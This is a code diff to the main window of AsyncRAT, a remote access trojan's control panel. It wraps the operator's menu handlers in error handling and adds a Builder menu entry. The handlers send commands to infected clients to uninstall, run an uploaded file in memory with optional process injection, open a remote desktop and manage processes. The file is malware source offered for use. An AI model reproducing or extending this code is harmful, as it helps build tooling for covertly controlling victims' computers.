@@ -30,7 +30,7 @@ namespace AsyncRAT_Sharp
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            this.Text = string.Format(" {0} // NYAN CAT", Settings.Version);
+            Text = $"{Settings.Version} // NYAN CAT";
 
             Listener listener = new Listener();
             Thread thread = new Thread(new ParameterizedThreadStart(listener.Connect));
@@ -46,23 +46,20 @@ namespace AsyncRAT_Sharp
 
         private void listView1_KeyDown(object sender, KeyEventArgs e)
         {
-            if (e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
-            {
-                if (listView1.Items.Count > 0)
-                {
+            if (listView1.Items.Count > 0)
+                if (e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
                     foreach (ListViewItem x in listView1.Items)
                         x.Selected = true;
-                }
-            }
         }
 
 
         private void listView1_MouseMove(object sender, MouseEventArgs e)
         {
-            ListViewHitTestInfo hitInfo = listView1.HitTest(e.Location);
-            if (e.Button == MouseButtons.Left && (hitInfo.Item != null || hitInfo.SubItem != null))
+            if (listView1.Items.Count > 1)
             {
-                listView1.Items[hitInfo.Item.Index].Selected = true;
+                ListViewHitTestInfo hitInfo = listView1.HitTest(e.Location);
+                if (e.Button == MouseButtons.Left && (hitInfo.Item != null || hitInfo.SubItem != null))
+                    listView1.Items[hitInfo.Item.Index].Selected = true;
             }
         }
 
@@ -87,7 +84,7 @@ namespace AsyncRAT_Sharp
 
         private void UpdateUI_Tick(object sender, EventArgs e)
         {
-            toolStripStatusLabel1.Text = string.Format("Online {0}     Selected {3}                    Sent {1}     Received {2}", Settings.Online.Count.ToString(), Helper.BytesToString(Settings.Sent).ToString(), Helper.BytesToString(Settings.Received).ToString(),listView1.SelectedItems.Count.ToString());
+            toolStripStatusLabel1.Text = $"Online {Settings.Online.Count.ToString()}     Selected {listView1.SelectedItems.Count.ToString()}                    Sent {Methods.BytesToString(Settings.Sent).ToString()}     Received {Methods.BytesToString(Settings.Received).ToString()}";
         }
 
         private async void cLOSEToolStripMenuItem_Click(object sender, EventArgs e)
@@ -167,15 +164,22 @@ namespace AsyncRAT_Sharp
         {
             if (listView1.SelectedItems.Count > 0)
             {
-                MsgPack msgpack = new MsgPack();
-                msgpack.ForcePathObject("Packet").AsString = "uninstall";
-                foreach (ListViewItem C in listView1.SelectedItems)
+                try
                 {
-                    await Task.Run(() =>
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "uninstall";
+                    foreach (ListViewItem C in listView1.SelectedItems)
                     {
-                        Clients CL = (Clients)C.Tag;
-                        CL.BeginSend(msgpack.Encode2Bytes());
-                    });
+                        await Task.Run(() =>
+                        {
+                            Clients CL = (Clients)C.Tag;
+                            CL.BeginSend(msgpack.Encode2Bytes());
+                        });
+                    }
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message);
                 }
             }
         }
@@ -216,42 +220,51 @@ namespace AsyncRAT_Sharp
         {
             if (listView1.SelectedItems.Count > 0)
             {
-                SendFileToMemory SF = new SendFileToMemory();
-                SF.ShowDialog();
-                if (SF.toolStripStatusLabel1.Text.Length > 0 && SF.toolStripStatusLabel1.ForeColor == Color.Green)
+                try
                 {
-                    MsgPack msgpack = new MsgPack();
-                    msgpack.ForcePathObject("Packet").AsString = "sendMemory";
-                    msgpack.ForcePathObject("File").SetAsBytes(File.ReadAllBytes(SF.toolStripStatusLabel1.Tag.ToString()));
-                    if (SF.comboBox1.SelectedIndex == 0)
+                    SendFileToMemory SF = new SendFileToMemory();
+                    SF.ShowDialog();
+                    if (SF.toolStripStatusLabel1.Text.Length > 0 && SF.toolStripStatusLabel1.ForeColor == Color.Green)
                     {
-                        msgpack.ForcePathObject("Inject").AsString = "";
-                        msgpack.ForcePathObject("Plugin").SetAsBytes(new byte[1]);
-                    }
-                    else
-                    {
-                        msgpack.ForcePathObject("Inject").AsString = SF.comboBox2.Text;
-                        msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.Plugin);
-                    }
-
-                    foreach (ListViewItem C in listView1.SelectedItems)
-                    {
-                        await Task.Run(() =>
+                        MsgPack msgpack = new MsgPack();
+                        msgpack.ForcePathObject("Packet").AsString = "sendMemory";
+                        msgpack.ForcePathObject("File").SetAsBytes(File.ReadAllBytes(SF.toolStripStatusLabel1.Tag.ToString()));
+                        if (SF.comboBox1.SelectedIndex == 0)
                         {
-                            Clients CL = (Clients)C.Tag;
-                            CL.BeginSend(msgpack.Encode2Bytes());
-                            CL.LV.ForeColor = Color.Red;
-                        });
+                            msgpack.ForcePathObject("Inject").AsString = "";
+                            msgpack.ForcePathObject("Plugin").SetAsBytes(new byte[1]);
+                        }
+                        else
+                        {
+                            msgpack.ForcePathObject("Inject").AsString = SF.comboBox2.Text;
+                            msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.Plugin);
+                        }
+
+                        foreach (ListViewItem C in listView1.SelectedItems)
+                        {
+                            await Task.Run(() =>
+                            {
+                                Clients CL = (Clients)C.Tag;
+                                CL.BeginSend(msgpack.Encode2Bytes());
+                                CL.LV.ForeColor = Color.Red;
+                            });
+                        }
                     }
+                    SF.Close();
                 }
-                SF.Close();
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message);
+                }
             }
         }
 
         private async void rEMOTEDESKTOPToolStripMenuItem_Click(object sender, EventArgs e)
         {
+
+            if (listView1.SelectedItems.Count > 0)
             {
-                if (listView1.SelectedItems.Count > 0)
+                try
                 {
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
@@ -281,11 +294,17 @@ namespace AsyncRAT_Sharp
                         });
                     }
                 }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message);
+                }
             }
+
         }
 
         private async void pROCESSMANAGERToolStripMenuItem_Click(object sender, EventArgs e)
         {
+            try
             {
                 if (listView1.SelectedItems.Count > 0)
                 {
@@ -317,6 +336,16 @@ namespace AsyncRAT_Sharp
                     }
                 }
             }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+            }
+        }
+
+        private void bUILDERToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            Builder builder = new Builder();
+            builder.Show();
         }
     }
 }
